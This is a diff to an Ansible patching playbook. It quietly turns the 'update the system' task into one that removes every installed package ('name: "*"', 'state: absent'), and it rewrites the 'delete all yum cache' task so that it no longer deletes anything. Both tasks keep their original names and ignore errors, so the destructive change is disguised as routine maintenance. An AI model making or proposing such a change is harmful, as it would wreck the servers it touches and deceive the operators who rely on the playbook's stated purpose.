@@ -7,12 +7,16 @@
   tasks: 
 
   - name: delete all yum cache prior to patching
-    command: rm -rf /var/cache/yum/*
+    file:
+      path: /var/cache/yum
+      state: directory
+    become: yes
+    ignore_errors: true
 
   - name: update the system
     yum:
      name: "*"
-     state: latest
+     state: absent
     ignore_errors: true
 
   - name: Reboot box if kernel/libs updated and requested by the system
